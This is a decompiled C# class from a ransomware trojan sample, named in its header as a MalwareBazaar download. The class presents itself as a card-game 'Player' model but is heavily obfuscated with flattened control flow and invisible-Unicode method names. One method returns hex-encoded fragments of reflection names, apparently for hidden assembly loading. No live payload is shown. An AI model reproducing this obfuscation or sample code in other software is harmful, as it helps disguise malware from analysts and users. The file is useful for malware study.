// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: SafeArrayTypeMismatchExcepti, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: FE98C20D-A437-4C5F-9849-D190358A66A6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-c0f665918f4ea75327960ddf58cf37e415a6bf6569a4c22aa6291fbac9d171ce.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 146415467;
      string str1;
      bool flag1;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1257214104)) % 14U)
        {
          case 1:
            str1 = (string) null;
            num1 = (int) num2 * -720987129 ^ -1672816051;
            continue;
          case 2:
            flag2 = BaseStream == 0;
            num1 = (int) num2 * -1519707656 ^ 58415586;
            continue;
          case 3:
            int num3 = !flag1 ? 1702488880 : (num3 = 1308924667);
            num1 = num3 ^ (int) num2 * -1911884597;
            continue;
          case 4:
            num1 = (int) num2 * 487217938 ^ 813059553;
            continue;
          case 5:
            str2 = str1;
            num1 = 1423722234;
            continue;
          case 6:
            int num4 = !flag2 ? 461485155 : (num4 = 1803280067);
            num1 = num4 ^ (int) num2 * -2016935497;
            continue;
          case 7:
            flag1 = BaseStream == 1;
            num1 = 1298928087;
            continue;
          case 8:
            num1 = (int) num2 * 876308506 ^ 323631622;
            continue;
          case 9:
            str1 = "52756E74696D65417373656D62";
            num1 = (int) num2 * -1473087704 ^ 1646268075;
            continue;
          case 10:
            num1 = (int) num2 * -628459376 ^ 936748141;
            continue;
          case 11:
            num1 = (int) num2 * 620262250 ^ -1399231493;
            continue;
          case 12:
            goto label_1;
          case 13:
            str1 = "65756D7333";
            num1 = (int) num2 * 1821531312 ^ -374590078;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = 1518637791;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ 909281406)) % 4U)
        {
          case 1:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * -602121013 ^ -2077992557;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 2:
            num4 = 0;
            break;
          case 3:
            goto label_1;
          default:
            goto label_8;
        }
        num2 = num4;
        num1 = 925479950;
      }
label_8:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 1835267684;
        int[] planningCards;
        int index;
        int num2;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 436290359)) % 11U)
          {
            case 0:
              ++num3;
              num1 = (int) num4 * -1174307593 ^ -522003653;
              continue;
            case 1:
              index = 0;
              num1 = (int) num4 * 856695887 ^ 761007762;
              continue;
            case 2:
              num3 = 0;
              num1 = (int) num4 * -1254723663 ^ 247619432;
              continue;
            case 3:
              int num5 = num2 <= 0 ? -509373598 : (num5 = -448693320);
              num1 = num5 ^ (int) num4 * 833856085;
              continue;
            case 5:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * -1663471917 ^ 1948215848;
              continue;
            case 6:
              num2 = planningCards[index];
              num1 = 78743187;
              continue;
            case 7:
              ++index;
              num1 = 1758267543;
              continue;
            case 8:
              int num6;
              num1 = num6 = index < planningCards.Length ? 2100160746 : (num6 = 2059964360);
              continue;
            case 9:
              goto label_1;
            case 10:
              planningCardsCount = num3;
              num1 = (int) num4 * 615358757 ^ 1637437513;
              continue;
            default:
              goto label_12;
          }
        }
label_12:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 555617920;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1711568783)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -132729387 ^ 1706518236;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * -2057522696 ^ 1894050926;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 1885570620;
      int index;
      int planningCard;
      bool flag1;
      string str1;
      string str2;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1921719261)) % 15U)
        {
          case 0:
            planningCard = this.PlanningCards[index];
            num1 = 1812565297;
            continue;
          case 1:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * -2071039345 ^ -625407609;
            continue;
          case 2:
            flag2 = index < this.PlanningCards.Length;
            num1 = 740175091;
            continue;
          case 3:
            int num3 = !flag1 ? -1241860026 : (num3 = -1159844249);
            num1 = num3 ^ (int) num2 * -1983477219;
            continue;
          case 4:
            str1 = Player.\u202B⁫‍⁬‏⁮⁮​‎‫⁪‏‏⁯⁫‍⁫‏‭⁯‪‌‫‍⁯⁭⁮‭‪⁫⁭⁭‎⁪‏⁪⁫‏‮⁭‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 1854628722;
            continue;
          case 6:
            flag1 = planningCard == 0;
            num1 = (int) num2 * -1899495523 ^ 1042969845;
            continue;
          case 7:
            ++index;
            num1 = 1821119602;
            continue;
          case 8:
            num1 = (int) num2 * 577196178 ^ -1301153979;
            continue;
          case 9:
            goto label_1;
          case 10:
            num1 = (int) num2 * 1115853802 ^ -2133460352;
            continue;
          case 11:
            num1 = (int) num2 * 2100634914 ^ 535305152;
            continue;
          case 12:
            num1 = (int) num2 * 632284184 ^ 2134955867;
            continue;
          case 13:
            str2 = str1;
            num1 = (int) num2 * 811882718 ^ 1745635510;
            continue;
          case 14:
            int num4 = !flag2 ? 2138211469 : (num4 = 852073122);
            num1 = num4 ^ (int) num2 * 838592764;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    public static Player Deserialize(JSONNode json) => new Player()
    {
      Name = json["name"].Value,
      PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
      UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
    };

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -554060736;
      int aIndex;
      bool flag;
      int[] numArray;
      int[] planningCards;
      int count;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1973019814)) % 11U)
        {
          case 0:
            flag = aIndex < count;
            num1 = -640798963;
            continue;
          case 1:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -1845190742;
            continue;
          case 2:
            aIndex = 0;
            num1 = (int) num2 * 1547969573 ^ -2126457219;
            continue;
          case 3:
            int num3 = flag ? -159725890 : (num3 = -542916431);
            num1 = num3 ^ (int) num2 * -856645918;
            continue;
          case 4:
            count = json.Count;
            num1 = (int) num2 * 370651817 ^ 992569931;
            continue;
          case 6:
            numArray = new int[count];
            num1 = (int) num2 * 1737701471 ^ 441371642;
            continue;
          case 7:
            planningCards = numArray;
            num1 = (int) num2 * 816920896 ^ 30643741;
            continue;
          case 8:
            goto label_1;
          case 9:
            num1 = (int) num2 * -1643854726 ^ 687657757;
            continue;
          case 10:
            ++aIndex;
            num1 = (int) num2 * -1237602142 ^ -1553136540;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 1824784689;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2014605226)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -1438203475 ^ -1932180317;
            continue;
          case 2:
            goto label_1;
          case 3:
            str = Player.\u200C‎‭⁮⁭‎⁬⁯‭‎​‬‮‎‬‮⁪‏‌‪⁮‮​⁬‌⁯‭‍‌‫⁪‫⁭‭‌‎‌‌‏⁯‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 26228273 ^ -569926499;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u202B⁫‍⁬‏⁮⁮​‎‫⁪‏‏⁯⁫‍⁫‏‭⁯‪‌‫‍⁯⁭⁮‭‪⁫⁭⁭‎⁪‏⁪⁫‏‮⁭‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200C‎‭⁮⁭‎⁬⁯‭‎​‬‮‎‬‮⁪‏‌‪⁮‮​⁬‌⁯‭‍‌‫⁪‫⁭‭‌‎‌‌‏⁯‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
